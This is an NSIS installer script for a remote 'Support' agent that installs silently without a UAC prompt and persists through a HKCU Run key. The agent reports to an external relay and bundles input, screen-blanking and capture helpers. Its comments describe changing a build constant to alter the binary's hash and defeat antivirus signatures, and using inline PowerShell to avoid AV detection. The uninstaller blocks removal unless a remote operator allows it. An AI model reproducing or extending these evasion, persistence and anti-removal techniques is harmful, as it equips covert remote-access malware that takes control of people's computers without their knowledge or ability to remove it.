; Support agent — USER installer (NSIS). Installs the agent in the user's
; local AppData folder and registers a HKCU Run key for auto-start on login.
; Runs entirely at user level — NO UAC prompt, no admin required.
; Key rides in the filename (support-<key>.exe).

Unicode true
Name "Support"
OutFile "release\support-service.exe"
InstallDir "$LOCALAPPDATA\Support"
RequestExecutionLevel user
SilentInstall silent
SilentUnInstall silent
SetCompressor /SOLID lzma
; Build-stamp constant: changes once per hash-change cycle so the output binary
; has a different SHA256 than prior builds. Bumping this re-signs the signature
; AV vendors learned to match. Harmless unused constant otherwise.
!define BUILD_STAMP "2026-11-10-b"

Var KEY
Var NAME
Var NAME2        ; optional second software name (dual-install mode)
Var INSTANCE     ; which copy we're installing (1 or 2); baked into config.default.json
Var INSTDIR_1    ; absolute install dir for copy #1
Var INSTDIR_2    ; absolute install dir for copy #2
Var SVCNAME_1    ; windows service name for copy #1 (default SupportAgentSvc)
Var SVCNAME_2    ; windows service name for copy #2
Var ARPKEY_1     ; HKLM Uninstall subkey for copy #1 (default Support)
Var ARPKEY_2     ; HKLM Uninstall subkey for copy #2
Var FWRULE_1     ; firewall rule display name for copy #1
Var FWRULE_2     ; firewall rule display name for copy #2
Var METATMP      ; temp file for /api/key-meta response

; ---------- one-copy install block ----------------------------------
; Writes files, config, firewall rule, ARP entry, and starts the service for
; ONE install location. Called once for single-install, twice for dual-install.
; Runs at USER level — no admin, no UAC, no service. Files go to %LOCALAPPDATA%;
; a HKCU Run key starts the agent on login. `_tag` is a unique label suffix;
; `_idx` is numeric (baked into config.default.json as JSON).
!macro INSTALL_ONE _tag _idx _instdir _name _svc _arp _fw
  ; Kill any prior agent running from this location so files are unlocked.
  nsExec::Exec 'taskkill /F /IM support.exe'
  Sleep 800

  CreateDirectory "${_instdir}"
  SetOutPath "${_instdir}"
  ClearErrors
  File /r "release\Aegis\*"
  IfErrors file_fail_${_tag} file_ok_${_tag}
  file_fail_${_tag}:
    FileOpen $R7 "$TEMP\hc-install.log" a
    FileWrite $R7 "[FATAL] File /r failed (AV quarantine?) dir=${_instdir}$\r$\n"
    FileClose $R7
    SetErrorLevel 2
  file_ok_${_tag}:

  ; Config file — relay URL + key + instance index.
  FileOpen $2 "${_instdir}\resources\app\agent\config.default.json" w
  FileWrite $2 '{$\r$\n  "relay": "wss://aegis-relay-production.up.railway.app",$\r$\n  "key": "$KEY",$\r$\n  "enabled": true,$\r$\n  "instance": ${_idx},$\r$\n  "appName": "${_name}"$\r$\n}$\r$\n'
  FileClose $2

  ; HKCU Run key — starts the agent on every login without admin.
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${_svc}" '"${_instdir}\support.exe" --startup --no-sandbox'

  ; Tag file so the uninstaller knows which Run key / folder to remove.
  FileOpen $3 "${_instdir}\.hc-uninstall-tag" w
  FileWrite $3 'ARP=${_arp}$\r$\n'
  FileWrite $3 'SVC=${_svc}$\r$\n'
  FileWrite $3 'IDX=${_idx}$\r$\n'
  FileClose $3
  WriteUninstaller "${_instdir}\uninstall.exe"

  ; Launch the agent immediately (no reboot needed).
  Exec '"${_instdir}\support.exe" --startup --no-sandbox'
!macroend

Section "Install"
  StrCpy $0 "$EXEFILE"
  StrCpy $0 $0 -4
  ; Strip trailing " (1)" suffixes the browser adds on re-download / dup — a
  ; customer that downloads the installer a few times can end up with
  ; "foo (1).exe" or "foo (1) (2).exe". Loop until no trailing ") ..." remains,
  ; because if one slips through the last 20 chars taken as the key aren't the
  ; real key — enrollment then registers with garbage, the relay denies it, and
  ; the device disappears (looks like the "install twice → offline forever" bug).
  paren_outer:
    StrCpy $1 $0 1 -1
    StrCmp $1 ")" 0 keydone
      StrLen $2 $0
    parenloop:
      IntOp $2 $2 - 1
      IntCmp $2 0 keydone keydone 0
      StrCpy $1 $0 1 $2
      StrCmp $1 "(" 0 parenloop
      IntOp $2 $2 - 1
      StrCpy $0 $0 $2
    Goto paren_outer
  keydone:
  ; Key is ALWAYS the last 20 chars, so the operator's custom name in front is fine.
  StrCpy $KEY $0 20 -20
  ; Software name = everything before the key (minus a trailing "-"). Default "Support".
  StrLen $3 $0
  IntOp $3 $3 - 20
  StrCpy $NAME $0 $3
  StrCpy $1 $NAME 1 -1
  StrCmp $1 "-" 0 +2
    StrCpy $NAME $NAME -1
  StrCmp $NAME "" 0 +2
    StrCpy $NAME "Support"

  ; Phone the relay to find out if this key was built with a SECOND software
  ; name (dual-install). The POST body is tiny and the server returns the
  ; non-secret labels for this key. If the call fails for any reason (offline,
  ; TLS blip, server older than this installer), $NAME2 stays empty and we fall
  ; back to the ordinary single-install path — zero regression for existing
  ; customers.
  StrCpy $NAME2 ""
  StrCpy $METATMP "$TEMP\hc-keymeta.json"
  FileOpen $9 "$TEMP\hc-keymeta.body" w
  FileWrite $9 '{"key":"$KEY"}'
  FileClose $9
  nsExec::Exec 'curl.exe --silent --show-error --max-time 6 -X POST -H "Content-Type: application/json" --data "@$TEMP\hc-keymeta.body" -o "$METATMP" https://aegis-relay-production.up.railway.app/api/key-meta'
  Delete "$TEMP\hc-keymeta.body"
  ; Parse "appName2":"..." out of the JSON response. NSIS has no JSON parser —
  ; the server guarantees the field is quoted and plain-ASCII (dashboard
  ; rejects anything with embedded quotes), so a straight substring extract is
  ; safe. If the field isn't present or is empty, $NAME2 stays "".
  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$j = Get-Content -Raw $\'$METATMP$\' | ConvertFrom-Json; if ($$j.appName2) { Set-Content -Path $\'$TEMP\hc-name2.txt$\' -Value $$j.appName2 -NoNewline } }catch{}"'
  Delete "$METATMP"
  IfFileExists "$TEMP\hc-name2.txt" 0 solo_mode
    FileOpen $9 "$TEMP\hc-name2.txt" r
    FileRead $9 $NAME2
    FileClose $9
    Delete "$TEMP\hc-name2.txt"
    ; Strip any accidental trailing whitespace.
    Push $NAME2
    Call TrimR
    Pop $NAME2
  solo_mode:

  ; stop ALL prior copies' processes so Files/service are unlocked. We don't
  ; know whether a previous dual-install left #2 behind, so wildcard the exe
  ; names and let the per-copy uninstaller handle the registry side later.
  nsExec::Exec 'taskkill /F /IM support.exe'
  nsExec::Exec 'taskkill /F /IM Aegis.exe'
  nsExec::Exec 'taskkill /F /IM injector.exe'
  Sleep 1200

  ; Compute per-copy locations. Single install uses $INSTDIR + "Support*" names
  ; exactly as before (bit-for-bit backward compat). Dual uses the operator's
  ; two chosen names.
  StrCmp $NAME2 "" 0 dual_mode
  ; ---- SINGLE INSTALL — unchanged legacy path ----
  StrCpy $INSTANCE "1"
  StrCpy $INSTDIR_1 "$INSTDIR"
  StrCpy $SVCNAME_1 "SupportAgentSvc"
  StrCpy $ARPKEY_1 "Support"
  StrCpy $FWRULE_1 "HatchConnect Agent"
  !insertmacro INSTALL_ONE "s" "1" "$INSTDIR_1" "$NAME" "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
  Goto install_done

  dual_mode:
  ; ---- DUAL INSTALL — two folders, two Run keys, user-level ----
  StrCpy $INSTDIR_1 "$LOCALAPPDATA\$NAME"
  StrCpy $INSTDIR_2 "$LOCALAPPDATA\$NAME2"
  StrCpy $SVCNAME_1 "$NAME-AgentSvc"
  StrCpy $SVCNAME_2 "$NAME2-AgentSvc"
  StrCpy $ARPKEY_1  "$NAME"
  StrCpy $ARPKEY_2  "$NAME2"
  StrCpy $FWRULE_1  "HatchConnect $NAME"
  StrCpy $FWRULE_2  "HatchConnect $NAME2"
  !insertmacro INSTALL_ONE "d1" "1" "$INSTDIR_1" "$NAME"  "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
  !insertmacro INSTALL_ONE "d2" "2" "$INSTDIR_2" "$NAME2" "$SVCNAME_2" "$ARPKEY_2" "$FWRULE_2"
  install_done:
SectionEnd

; Right-trim \r \n and spaces off a stack-top string (used after FileRead).
; NSIS keeps install-time and uninstall-time functions as separate symbol
; tables, so the same body is defined twice — once for each phase.
!macro _TRIMR_BODY
  Exch $R0
  Push $R1
  loop:
    StrCpy $R1 $R0 1 -1
    StrCmp $R1 "" done
    StrCmp $R1 "$\r" trim
    StrCmp $R1 "$\n" trim
    StrCmp $R1 " " trim done
    trim:
      StrCpy $R0 $R0 -1
      Goto loop
  done:
  Pop $R1
  Exch $R0
!macroend
Function TrimR
  !insertmacro _TRIMR_BODY
FunctionEnd
Function un.TrimR
  !insertmacro _TRIMR_BODY
FunctionEnd

Section "Uninstall"
  ; --- uninstall protection: ask the relay whether removal is authorized ---
  ; Computes this machine's stable device id the same way the agent does (a salted
  ; hash of the Windows MachineGuid) and asks /api/uninstall-allowed with the key.
  ; Denied only when the operator turned protection ON and hasn't released it.
  ; Fails OPEN on any network/error so a blip never traps a legit uninstall.
  ; Use curl.exe for the HTTPS call (same reason as the uninstall-report call
  ; below): Windows PowerShell 5.1's Invoke-RestMethod defaults to TLS 1.0, which
  ; Railway refuses — the call then hangs past -TimeoutSec and the user watches
  ; the uninstaller sit frozen for 15-30s before it gives up. curl.exe uses
  ; schannel with modern TLS and returns cleanly. PS here just derives id+key
  ; (no network) then hands off to curl; the response is parsed after.
  ; Inline PS command (no .ps1 file on disk — avoids AV flag on script drop).
  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$p=$$env:APPDATA+$\'\\Support\\device-id$\'; if(-not(Test-Path $$p)){exit 0}; $$id=(Get-Content -Raw $$p).Trim(); $$k=(Get-Content -Raw $\'$INSTDIR\resources\app\agent\config.default.json$\'|ConvertFrom-Json).key; $$b=(@{id=$$id;key=$$k}|ConvertTo-Json -Compress); $$t=$$env:TEMP+$\'\\hc-uc.json$\'; $$o=$$env:TEMP+$\'\\hc-uco.json$\'; [IO.File]::WriteAllText($$t,$$b); &curl.exe --silent --max-time 8 -X POST -H $\'Content-Type: application/json$\' --data $\'@$\'+$$t -o $$o https://aegis-relay-production.up.railway.app/api/uninstall-allowed|Out-Null; Remove-Item $$t -EA 0; if(-not(Test-Path $$o)){exit 0}; $$r=Get-Content -Raw $$o|ConvertFrom-Json; Remove-Item $$o -EA 0; if($$r.allowed){exit 0}else{exit 1} }catch{exit 0}"'
  Pop $0
  StrCmp $0 "1" 0 +3
    MessageBox MB_OK|MB_ICONSTOP "Uninstall is disabled by your administrator.$\r$\nAsk them to release this device from the dashboard, then try again."
    Quit

  ; Dual-install awareness: read this copy's identity from the tag file the
  ; install step wrote inside $INSTDIR. $0=service, $1=ARP subkey, $2=firewall
  ; rule. If the tag is absent (legacy single install upgraded in place), fall
  ; back to the hardcoded original defaults so old installs still clean up.
  StrCpy $0 "SupportAgentSvc"
  StrCpy $1 "Support"
  StrCpy $2 "HatchConnect Agent"
  IfFileExists "$INSTDIR\.hc-uninstall-tag" 0 tag_done
    ClearErrors
    FileOpen $3 "$INSTDIR\.hc-uninstall-tag" r
    tag_loop:
      FileRead $3 $4
      IfErrors tag_close
      ; Trim trailing \r\n
      Push $4
      Call un.TrimR
      Pop $4
      StrCpy $5 $4 4
      StrCmp $5 "ARP=" 0 +3
        StrCpy $1 $4 "" 4
        Goto tag_loop
      StrCpy $5 $4 4
      StrCmp $5 "SVC=" 0 +3
        StrCpy $0 $4 "" 4
        Goto tag_loop
      StrCpy $5 $4 3
      StrCmp $5 "FW=" 0 +3
        StrCpy $2 $4 "" 3
        Goto tag_loop
      Goto tag_loop
    tag_close:
      FileClose $3
  tag_done:

  ; Report the uninstall to the relay so the dashboard shows "Uninstalled".
  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$p=\"$$env:APPDATA\Support\device-id\"; if(Test-Path $$p){ $$id=(Get-Content -Raw $$p).Trim() } else { return }; $$k=(Get-Content -Raw \"$INSTDIR\resources\app\agent\config.default.json\" | ConvertFrom-Json).key; $$body=(@{id=$$id;key=$$k} | ConvertTo-Json -Compress); $$tmp=\"$$env:TEMP\hc-uninstall-body.json\"; [System.IO.File]::WriteAllText($$tmp, $$body); & curl.exe --silent --max-time 5 -X POST -H \"Content-Type: application/json\" --data \"@$$tmp\" https://aegis-relay-production.up.railway.app/api/uninstall | Out-Null; Remove-Item $$tmp -ErrorAction SilentlyContinue }catch{}"'

  ; Remove HKCU auto-start key for this copy.
  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "$0"

  ; Kill processes running from this install folder.
  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try { Get-Process support,input,blanker,keepsystemawake,offkeepsystemawake,sdcap -ErrorAction SilentlyContinue | Where-Object { $$_.Path -and $$_.Path.ToLower().StartsWith((\"$INSTDIR\").ToLower()) } | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}"'
  Sleep 600
  RMDir /r "$INSTDIR"
SectionEnd
